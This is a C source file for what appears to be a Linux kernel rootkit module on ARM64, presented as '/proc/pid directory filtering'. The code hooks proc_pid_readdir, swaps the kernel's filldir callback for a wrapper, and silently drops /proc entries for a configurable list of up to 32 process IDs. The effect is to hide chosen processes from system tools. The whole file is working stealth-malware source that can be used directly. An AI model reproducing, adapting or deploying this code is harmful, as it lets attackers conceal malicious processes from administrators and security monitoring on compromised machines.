/* SPDX-License-Identifier: GPL-2.0 */
/* nvk_pid_vis.c — /proc/pid directory filtering via readdir filter. */
#include <nvk.h>
#include "nvk_internal.h"

/* ---- internal typedefs ---- */

typedef int (*neverc_krt_filldir_fn)(void *ctx, const char *name, int namlen,
				     long long offset, u64 ino, unsigned int type);

static __always_inline int _neverc_krt_atoi(const char *s, int len)
{
	int val = 0, i;
	for (i = 0; i < len; i++) {
		if (s[i] < '0' || s[i] > '9') return -1;
		val = val * 10 + (s[i] - '0');
	}
	return val;
}

/* ---- internal structs ---- */

#define NEVERC_KRT_VIS_PID_MAX 32
#define _NEVERC_KRT_PID_ACTOR_SLOTS 8

struct neverc_krt_pid_vis_state {
	int              pids[NEVERC_KRT_VIS_PID_MAX];
	int              count;
	struct neverc_krt_interpose_ctx ctx_interpose;
	int              active;
};

struct _neverc_krt_pid_actor_slot {
	volatile unsigned long task;
	neverc_krt_filldir_fn orig;
};

/* ---- internal variables ---- */

static struct neverc_krt_pid_vis_state _neverc_krt_pid_state;

static struct _neverc_krt_pid_actor_slot
	_neverc_krt_pid_actors[_NEVERC_KRT_PID_ACTOR_SLOTS];

/* ---- internal helpers ---- */

static int _neverc_krt_pid_is_filtered(int pid)
{
	int i;
	for (i = 0; i < _neverc_krt_pid_state.count; i++) {
		if (_neverc_krt_pid_state.pids[i] == pid)
			return 1;
	}
	return 0;
}

static int _neverc_krt_pid_actor_acquire(neverc_krt_filldir_fn orig)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
	for (i = 0; i < _NEVERC_KRT_PID_ACTOR_SLOTS; i++) {
		if (__atomic_load_n(&_neverc_krt_pid_actors[i].task,
				    __ATOMIC_ACQUIRE) == self) {
			_neverc_krt_pid_actors[i].orig = orig;
			return i;
		}
	}
	for (i = 0; i < _NEVERC_KRT_PID_ACTOR_SLOTS; i++) {
		unsigned long expected = 0;
		if (__atomic_compare_exchange_n(
			&_neverc_krt_pid_actors[i].task,
			&expected, self, 0,
			__ATOMIC_ACQ_REL, __ATOMIC_RELAXED)) {
			_neverc_krt_pid_actors[i].orig = orig;
			return i;
		}
	}
	return -1;
}

static neverc_krt_filldir_fn _neverc_krt_pid_actor_get_orig(void)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
	for (i = 0; i < _NEVERC_KRT_PID_ACTOR_SLOTS; i++) {
		if (__atomic_load_n(&_neverc_krt_pid_actors[i].task,
				    __ATOMIC_ACQUIRE) == self)
			return _neverc_krt_pid_actors[i].orig;
	}
	return (neverc_krt_filldir_fn)0;
}

static int _neverc_krt_pid_filldir_wrap(void *ctx, const char *name, int namlen,
					long long offset, u64 ino, unsigned int type)
{
	if (namlen > 0 && name[0] >= '1' && name[0] <= '9') {
		int pid = _neverc_krt_atoi(name, namlen);
		if (pid > 0 && _neverc_krt_pid_is_filtered(pid))
			return 0;
	}
	neverc_krt_filldir_fn orig = _neverc_krt_pid_actor_get_orig();
	if (orig)
		return orig(ctx, name, namlen, offset, ino, type);
	return 0;
}

static void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx)
{
	unsigned long dir_ctx_ptr = ctx->regs[1];
	if (!dir_ctx_ptr) return;

	neverc_krt_filldir_fn actor;
	if (neverc_krt_mem_read(&actor, (void *)dir_ctx_ptr, 8))
		return;
	if (!actor) return;
	if (actor == (neverc_krt_filldir_fn)_neverc_krt_pid_filldir_wrap)
		return;

	if (_neverc_krt_pid_actor_acquire(actor) < 0)
		return;

	neverc_krt_filldir_fn wrap = _neverc_krt_pid_filldir_wrap;
	neverc_krt_mem_write((void *)dir_ctx_ptr, &wrap, 8);
}

/* ---- public API ---- */

int neverc_krt_vis_pid_check(int pid)
{
	return _neverc_krt_pid_is_filtered(pid);
}

int neverc_krt_vis_pid_add(int pid)
{
	if (_neverc_krt_pid_state.count >= NEVERC_KRT_VIS_PID_MAX)
		return -1;
	_neverc_krt_pid_state.pids[_neverc_krt_pid_state.count++] = pid;
	return 0;
}

int neverc_krt_vis_pid_remove(int pid)
{
	int i;
	for (i = 0; i < _neverc_krt_pid_state.count; i++) {
		if (_neverc_krt_pid_state.pids[i] == pid) {
			_neverc_krt_pid_state.pids[i] =
				_neverc_krt_pid_state.pids[--_neverc_krt_pid_state.count];
			return 0;
		}
	}
	return -1;
}

int neverc_krt_vis_pid_install(void)
{
	void *target;

	if (_neverc_krt_pid_state.active) return 0;

	target = NEVERC_KRT_LOOKUP("proc_pid_readdir");
	if (!target)
		target = NEVERC_KRT_LOOKUP("proc_readdir");
	if (!target) {
		_neverc_krt_pid_state.active = 1;
		return 0;
	}

	int ret = neverc_krt_interpose_install_ctx(&_neverc_krt_pid_state.ctx_interpose,
				       target, _neverc_krt_pid_readdir_ctx,
				       (void *)0);
	if (ret) {
		_neverc_krt_pid_state.active = 1;
		return ret;
	}

	_neverc_krt_pid_state.active = 1;
	return 0;
}

void neverc_krt_vis_pid_cleanup(void)
{
	if (!_neverc_krt_pid_state.active) return;
	if (_neverc_krt_pid_state.ctx_interpose.base.active)
		neverc_krt_interpose_remove_ctx(&_neverc_krt_pid_state.ctx_interpose);
	_neverc_krt_pid_state.active = 0;
	_neverc_krt_pid_state.count = 0;
}
